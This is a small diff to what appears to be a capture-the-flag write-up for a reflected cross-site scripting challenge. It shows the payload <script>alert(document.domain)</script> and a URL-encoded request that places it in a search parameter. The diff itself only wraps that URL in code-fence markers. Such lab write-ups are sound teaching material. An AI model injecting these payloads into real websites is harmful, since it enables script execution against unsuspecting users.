@@ -21,4 +21,6 @@ Just add the payload on the search field.
 
 Payload: <script>alert(document.domain)</script>
 
+```
 http://1.challenge.xss.site/search.php?term=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+```
